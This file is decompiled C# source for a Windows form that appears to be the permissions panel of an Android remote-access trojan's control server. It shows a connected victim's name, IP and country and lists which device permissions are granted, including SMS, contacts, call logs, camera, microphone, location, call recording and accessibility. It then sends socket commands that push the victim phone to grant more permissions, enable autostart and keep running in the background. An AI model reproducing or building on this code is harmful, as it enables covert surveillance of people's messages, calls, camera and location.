using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200009E RID: 158
[DesignerGenerated]
public partial class PermissionsManager : Form
{
	// Token: 0x060006C7 RID: 1735 RVA: 0x000033C7 File Offset: 0x000015C7
	public PermissionsManager()
	{
		base.Load += this.PermissionsManager_Load;
		this.Acces_prog = false;
		this.draw_prog = false;
		this.install_prog = false;
		this.battary_prog = false;
		this.InitializeComponent();
	}

	// Token: 0x060006C8 RID: 1736 RVA: 0x000AB24C File Offset: 0x000A944C
	public void UpdatePrims(object[] obj)
	{
		if (this.DGVPRIM.InvokeRequired)
		{
			PermissionsManager.recordnames method = new PermissionsManager.recordnames(this.UpdatePrims);
			this.DGVPRIM.Invoke(method, new object[]
			{
				obj
			});
		}
		else
		{
			string[] array = (string[])obj[0];
			if (this.DGVPRIM.Rows.Count > 0)
			{
				this.DGVPRIM.Rows.Clear();
			}
			Bitmap bitmap = (Bitmap)Codes.ResizeImage(Resources.correctsign, new Size(45, 45), false);
			Bitmap bitmap2 = (Bitmap)Codes.ResizeImage(Resources.X_sign, new Size(45, 45), false);
			try
			{
				if (Operators.CompareString(array[0], "1", false) == 0)
				{
					int index = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Accessibility Service",
						"ON"
					});
					this.DGVPRIM.Rows[index].Cells[2].Style.ForeColor = Color.Lime;
					this.Acces_prog = true;
					this.checkacess.Checked = true;
					this.checkacess.Enabled = false;
				}
				else
				{
					int index2 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Accessibility Service",
						"OFF"
					});
					this.DGVPRIM.Rows[index2].Cells[2].Style.ForeColor = Color.Red;
					this.Acces_prog = true;
					this.checkacess.Checked = false;
					this.checkacess.Enabled = true;
				}
				if (Operators.CompareString(array[1], "1", false) == 0)
				{
					int index3 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Read Contacts",
						"ON"
					});
					this.DGVPRIM.Rows[index3].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index4 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Read Contacts",
						"OFF"
					});
					this.DGVPRIM.Rows[index4].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[2], "1", false) == 0)
				{
					int index5 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Read SMS",
						"ON"
					});
					this.DGVPRIM.Rows[index5].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index6 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Read SMS",
						"OFF"
					});
					this.DGVPRIM.Rows[index6].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[3], "1", false) == 0)
				{
					int index7 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Read Call Logs",
						"ON"
					});
					this.DGVPRIM.Rows[index7].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index8 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Read Call Logs",
						"OFF"
					});
					this.DGVPRIM.Rows[index8].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[4], "1", false) == 0)
				{
					int index9 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Camera",
						"ON"
					});
					this.DGVPRIM.Rows[index9].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index10 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Camera",
						"OFF"
					});
					this.DGVPRIM.Rows[index10].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[5], "1", false) == 0)
				{
					int index11 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Read Accounts",
						"ON"
					});
					this.DGVPRIM.Rows[index11].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index12 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Read Accounts",
						"OFF"
					});
					this.DGVPRIM.Rows[index12].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[6], "1", false) == 0)
				{
					int index13 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Microphone",
						"ON"
					});
					this.DGVPRIM.Rows[index13].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index14 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Microphone",
						"OFF"
					});
					this.DGVPRIM.Rows[index14].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[7], "1", false) == 0)
				{
					int index15 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Location",
						"ON"
					});
					this.DGVPRIM.Rows[index15].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index16 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Location",
						"OFF"
					});
					this.DGVPRIM.Rows[index16].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[8], "1", false) == 0)
				{
					int index17 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Make Calls",
						"ON"
					});
					this.DGVPRIM.Rows[index17].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index18 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Make Calls",
						"OFF"
					});
					this.DGVPRIM.Rows[index18].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[9], "1", false) == 0)
				{
					int index19 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Record Calls",
						"ON"
					});
					this.DGVPRIM.Rows[index19].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index20 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Record Calls",
						"OFF"
					});
					this.DGVPRIM.Rows[index20].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[10], "1", false) == 0)
				{
					int index21 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Send SMS",
						"ON"
					});
					this.DGVPRIM.Rows[index21].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index22 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Send SMS",
						"OFF"
					});
					this.DGVPRIM.Rows[index22].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[11], "1", false) == 0)
				{
					int index23 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Change Wallpaper",
						"ON"
					});
					this.DGVPRIM.Rows[index23].Cells[2].Style.ForeColor = Color.Lime;
				}
				else
				{
					int index24 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Change Wallpaper",
						"OFF"
					});
					this.DGVPRIM.Rows[index24].Cells[2].Style.ForeColor = Color.Red;
				}
				if (Operators.CompareString(array[12], "1", false) == 0)
				{
					int index25 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"battery optimizing",
						"ON"
					});
					this.DGVPRIM.Rows[index25].Cells[2].Style.ForeColor = Color.Lime;
					this.battary_prog = true;
					this.checkbattery.Checked = true;
					this.checkbattery.Enabled = false;
				}
				else
				{
					int index26 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"battery optimizing",
						"OFF"
					});
					this.DGVPRIM.Rows[index26].Cells[2].Style.ForeColor = Color.Red;
					this.battary_prog = true;
					this.checkbattery.Checked = false;
					this.checkbattery.Enabled = true;
				}
				if (Operators.CompareString(array[13], "1", false) == 0)
				{
					int index27 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Draw over apps",
						"ON"
					});
					this.DGVPRIM.Rows[index27].Cells[2].Style.ForeColor = Color.Lime;
					this.draw_prog = true;
					this.checkdraw.Checked = true;
					this.checkdraw.Enabled = false;
				}
				else
				{
					int index28 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Draw over apps",
						"OFF"
					});
					this.DGVPRIM.Rows[index28].Cells[2].Style.ForeColor = Color.Red;
					this.draw_prog = true;
					this.checkdraw.Checked = false;
					this.checkdraw.Enabled = true;
				}
				if (Operators.CompareString(array[14], "1", false) == 0)
				{
					int index29 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap,
						"Install Apps",
						"ON"
					});
					this.DGVPRIM.Rows[index29].Cells[2].Style.ForeColor = Color.Lime;
					this.install_prog = true;
					this.checkinstall.Checked = true;
					this.checkinstall.Enabled = false;
				}
				else
				{
					int index30 = this.DGVPRIM.Rows.Add(new object[]
					{
						bitmap2,
						"Install Apps",
						"OFF"
					});
					this.DGVPRIM.Rows[index30].Cells[2].Style.ForeColor = Color.Red;
					this.install_prog = true;
					this.checkinstall.Checked = false;
					this.checkinstall.Enabled = true;
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060006C9 RID: 1737 RVA: 0x000ABFA0 File Offset: 0x000AA1A0
	public void UpdateStatus(object[] obj)
	{
		if (this.statustext.InvokeRequired)
		{
			PermissionsManager.updatedele method = new PermissionsManager.updatedele(this.UpdateStatus);
			this.statustext.Invoke(method, new object[]
			{
				obj
			});
		}
		else
		{
			string text = Conversions.ToString(obj[0]);
			this.statustext.Text = text;
		}
	}

	// Token: 0x060006CA RID: 1738 RVA: 0x000ABFF8 File Offset: 0x000AA1F8
	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"RPM<*>[lod]",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
			EagleAlert.ShowSucess("Loading Permissions Started...");
		}
	}

	// Token: 0x060006CB RID: 1739 RVA: 0x000AC11C File Offset: 0x000AA31C
	private void Addactiv_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.comboproms.Text) | string.IsNullOrWhiteSpace(this.comboproms.Text))
		{
			EagleAlert.Showinformation("Select Permission to Add");
		}
		else if (this.Primslist.Items.Contains(this.comboproms.Text))
		{
			EagleAlert.Showinformation("Permission All Ready Add");
		}
		else
		{
			this.Primslist.Items.Add(this.comboproms.Text);
			this.comboproms.Text = "";
		}
	}

	// Token: 0x060006CC RID: 1740 RVA: 0x000AC1B0 File Offset: 0x000AA3B0
	private void Button1_Click(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			try
			{
				if (this.Primslist.Items.Count < 1)
				{
					EagleAlert.Showinformation("Add Permissions to list First");
				}
				else
				{
					string text = "";
					foreach (object value in this.Primslist.Items)
					{
						string left = Conversions.ToString(value);
						if (Operators.CompareString(left, "Send SMS", false) == 0)
						{
							text += "SS<";
						}
						if (Operators.CompareString(left, "Record Calls", false) == 0)
						{
							text += "RC<";
						}
						if (Operators.CompareString(left, "Change Wallpaper", false) == 0)
						{
							text += "SW<";
						}
						if (Operators.CompareString(left, "Read SMS", false) == 0)
						{
							text += "RS<";
						}
						if (Operators.CompareString(left, "Read Call Logs", false) == 0)
						{
							text += "RCG<";
						}
						if (Operators.CompareString(left, "Read Contacts", false) == 0)
						{
							text += "CRC<";
						}
						if (Operators.CompareString(left, "Read Accounts", false) == 0)
						{
							text += "GA<";
						}
						if (Operators.CompareString(left, "Camera", false) == 0)
						{
							text += "CA<";
						}
						if (Operators.CompareString(left, "Microphone", false) == 0)
						{
							text += "MC<";
						}
						if (Operators.CompareString(left, "Location", false) == 0)
						{
							text += "LOC<";
						}
						if (Operators.CompareString(left, "Make Calls", false) == 0)
						{
							text += "CL<";
						}
					}
					TcpClient myClient = this.Classclient.myClient;
					string[] array = this.Classclient.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"RPM<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(parametersObjects);
					EagleAlert.ShowSucess("Loading Permissions Started...");
					this.Primslist.Items.Clear();
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060006CD RID: 1741 RVA: 0x000AC4E4 File Offset: 0x000AA6E4
	private void Button2_Click(object sender, EventArgs e)
	{
		if (this.Primslist.Items.Count == 0)
		{
		}
		if (this.Primslist.Items.Count > 0)
		{
			if (this.Primslist.SelectedItem != null)
			{
				this.Primslist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Primslist.SelectedItem));
			}
			else
			{
				EagleAlert.Showinformation("Select Permission First");
			}
		}
		else
		{
			EagleAlert.Showinformation("No Permission to Remove");
		}
	}

	// Token: 0x060006CE RID: 1742 RVA: 0x000AC564 File Offset: 0x000AA764
	private void Checkacess_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkacess.Enabled && this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"RPM<*>ACC",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
			EagleAlert.ShowSucess("Request Sent...");
		}
	}

	// Token: 0x060006CF RID: 1743 RVA: 0x000AC698 File Offset: 0x000AA898
	private void Checkdraw_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkdraw.Enabled && this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"RPM<*>DRW",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
			EagleAlert.ShowSucess("Request Sent...");
		}
	}

	// Token: 0x060006D0 RID: 1744 RVA: 0x000AC7CC File Offset: 0x000AA9CC
	private void checkbattery_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkbattery.Enabled && this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"RPM<*>DOZ",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
			EagleAlert.ShowSucess("Request Sent...");
		}
	}

	// Token: 0x060006D1 RID: 1745 RVA: 0x0000206C File Offset: 0x0000026C
	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
	}

	// Token: 0x060006D2 RID: 1746 RVA: 0x000AC900 File Offset: 0x000AAB00
	private void Toggle2_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkautostart.Checked && this.Classclient != null)
		{
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"rmiui<*>au",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060006D3 RID: 1747 RVA: 0x000ACA28 File Offset: 0x000AAC28
	private void Checkbg_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.Checkbg.Checked && this.Classclient != null)
		{
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				this.Classclient.myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"rmiui<*>bg",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060006D4 RID: 1748 RVA: 0x000ACB50 File Offset: 0x000AAD50
	private void DrakeUICheckBox1_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.checkinstall.Enabled && this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"RPM<*>INST",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
			EagleAlert.ShowSucess("Request Sent...");
		}
	}

	// Token: 0x060006D5 RID: 1749 RVA: 0x000ACC84 File Offset: 0x000AAE84
	private void PermissionsManager_Load(object sender, EventArgs e)
	{
		try
		{
			this.ClientPic.Image = this.Classclient.Wallpaper;
			this.clinameinfo.Text = string.Concat(new string[]
			{
				"Name: ",
				this.Classclient.ClientName,
				Strings.Space(2),
				"IP: ",
				this.Classclient.ClientAddressIP,
				Strings.Space(2),
				"Country: ",
				this.Classclient.Country
			});
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x040009EF RID: 2543
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	// Token: 0x040009F0 RID: 2544
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	// Token: 0x040009F1 RID: 2545
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addactiv")]
	private Button _addactiv;

	// Token: 0x040009F2 RID: 2546
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	// Token: 0x040009F3 RID: 2547
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	// Token: 0x040009F4 RID: 2548
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkbattery")]
	private DrakeUICheckBox _checkbattery;

	// Token: 0x040009F5 RID: 2549
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkdraw")]
	private DrakeUICheckBox _checkdraw;

	// Token: 0x040009F6 RID: 2550
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkacess")]
	private DrakeUICheckBox _checkacess;

	// Token: 0x040009F7 RID: 2551
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Checkbg")]
	private DrakeUICheckBox _Checkbg;

	// Token: 0x040009F8 RID: 2552
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkautostart")]
	private DrakeUICheckBox _checkautostart;

	// Token: 0x040009F9 RID: 2553
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkinstall")]
	private DrakeUICheckBox _checkinstall;

	// Token: 0x040009FA RID: 2554
	public Client Classclient;

	// Token: 0x040009FB RID: 2555
	public bool Acces_prog;

	// Token: 0x040009FC RID: 2556
	public bool draw_prog;

	// Token: 0x040009FD RID: 2557
	public bool install_prog;

	// Token: 0x040009FE RID: 2558
	public bool battary_prog;

	// Token: 0x0200009F RID: 159
	// (Invoke) Token: 0x060006D7 RID: 1751
	public delegate void recordnames(object[] obj);

	// Token: 0x020000A0 RID: 160
	// (Invoke) Token: 0x060006DB RID: 1755
	public delegate void updatedele(object[] obj);
}
